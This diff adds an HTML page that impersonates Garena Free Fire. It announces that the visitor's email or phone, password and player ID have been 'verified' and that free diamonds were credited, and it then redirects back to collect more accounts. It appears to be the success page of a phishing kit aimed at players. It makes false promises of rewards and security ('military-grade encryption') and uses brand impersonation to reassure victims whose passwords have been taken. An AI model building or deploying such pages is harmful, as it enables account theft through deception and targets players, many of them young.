@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html><head><title>Verification Successful</title>
+<style>
+:root{--success:#27ae60;--dark:#1a1a2e;--gold:#f39c12}
+body{font-family:'SF Pro Display',-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:linear-gradient(135deg,var(--success),#2ecc71);color:var(--dark);text-align:center;padding:60px;font-size:22px;min-height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;max-width:600px;margin:0 auto}
+.container{background:rgba(255,255,255,0.1);backdrop-filter:blur(25px);padding:60px 48px;border-radius:28px;border:1px solid rgba(255,255,255,0.2);box-shadow:0 40px 120px rgba(39,174,96,0.3)}
+.success-icon{width:140px;height:140px;background:linear-gradient(135deg,#ffffff,#f8f9ff);border-radius:50%;margin:0 auto 45px;display:flex;align-items:center;justify-content:center;font-size:64px;font-weight:700;color:var(--success);border:6px solid rgba(255,255,255,0.5);box-shadow:0 30px 90px rgba(39,174,96,0.25)}
+.title{font-size:42px;font-weight:700;margin:30px 0 20px;color:var(--dark);letter-spacing:-0.8px}
+.message{font-size:19px;color:#2c3e50;margin-bottom:40px;max-width:520px;line-height:1.7}
+.status-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:28px;margin:50px 0;padding:40px;background:rgba(255,255,255,0.2);backdrop-filter:blur(20px);border-radius:24px;border:1px solid rgba(255,255,255,0.3)}
+.status-item{background:rgba(255,255,255,0.95);padding:24px 32px;border-radius:20px;box-shadow:0 12px 40px rgba(0,0,0,0.1);font-weight:600;font-size:17px;text-align:center}
+.btn{display:inline-block;padding:24px 52px;background:linear-gradient(135deg,var(--gold),#f1c40f);color:var(--dark);text-decoration:none;border-radius:20px;font-weight:600;font-size:18px;margin-top:35px;text-transform:uppercase;letter-spacing:0.6px;box-shadow:0 20px 70px rgba(243,156,18,0.35);transition:all 0.3s}
+.btn:hover{transform:translateY(-5px);box-shadow:0 30px 90px rgba(243,156,18,0.45)}
+.footer{margin-top:70px;padding-top:45px;border-top:3px solid rgba(255,255,255,0.5);font-size:15px;color:rgba(255,255,255,0.98);max-width:520px;line-height:1.6}
+@media(max-width:480px){body{padding:40px 20px;font-size:19px}.container{padding:45px 32px}.status-grid{grid-template-columns:1fr;gap:20px;padding:28px}}
+</style></head>
+<body>
+<div class="container">
+<div class="success-icon">✓</div>
+<h1 class="title">Verification Successful</h1>
+<div class="message">All account details verified successfully. Diamond rewards have been credited to your Free Fire account and will appear after game restart (60 seconds).</div>
+<div class="status-grid">
+<div class="status-item">Email/Phone ✓</div>
+<div class="status-item">Password ✓</div>
+<div class="status-item">Player ID ✓</div>
+</div>
+<div style="font-size:24px;font-weight:600;margin:35px 0;color:#2c3e50;">Rewards delivered - restart game to view balance</div>
+<a href="/" class="btn">Verify Another Account</a>
+<div class="footer">
+<p>© 2026 Garena Free Fire Enterprise Rewards Platform</p>
+<p>Protected by military-grade encryption and fraud detection systems</p>
+</div>
+</div>
+<script>setTimeout(()=>location.href='/',9000)</script>
+</body></html>
